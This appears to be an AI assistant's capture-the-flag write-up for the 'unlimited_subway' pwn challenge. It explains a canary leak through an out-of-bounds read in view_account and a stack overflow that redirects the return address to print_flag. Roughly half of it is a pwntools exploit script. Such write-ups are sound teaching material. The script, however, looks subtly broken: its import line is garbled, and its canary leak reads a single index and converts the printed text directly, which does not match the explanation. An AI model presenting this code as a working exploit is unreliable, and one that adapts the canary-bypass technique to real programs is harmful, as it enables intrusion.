Here are the detailed steps to solve this unlimited_subway pwn challenge:

The program has an arbitrary read vulnerability in the view_account function that can print out an arbitrary index of the account info buffer. This can be used to leak the canary value.
In the main function, there is a buffer overflow vulnerability when reading the "Name" input. We can overwrite the return address with the address of print_flag function to get the flag.
To bypass the canary, first use the view_account function to leak the canary value. Then in the payload to overflow the buffer, first provide the leaked canary value, followed by padding and then the address of print_flag.
The payload will need to be crafted carefully - overflow with the right amount to overwrite the saved return address.

Here is the Python exploit code:
pythonfrom pwn import *

exe = ELF('./unlimited_subway')
p = process('./unlimited_subway')

def leak_canary():
    # View account at index 40 to leak stack canary
    p.sendlineafter('>', 'V') 
    p.sendlineafter('Index : ', str(40))
    p.recvuntil('Index 40 : ')
    leaked = p.recvline().strip()
    print("Leaked canary:", leaked)
    canary = u32(leaked.rjust(4,b'\x00'))
    return canary

def exploit(canary):
    padding = b'A' * 44
    payload = padding + p32(canary) + b'B' * 12 + p32(exe.symbols['print_flag'])
    p.sendlineafter('>', 'E')
    p.sendlineafter('Name Size : ', str(len(payload))) 
    p.sendlineafter('Name : ', payload)
    p.interactive()

canary = leak_canary()
exploit(canary)
This first leaks the canary, then constructs a payload with padding, canary, more padding, return address overwrite, and sends it to trigger the buffer overflow and get code execution.
The key steps are leaking the canary to bypass stack protection, and overwriting the saved return address with the address of print_flag function. Let me know if you have any other questions!
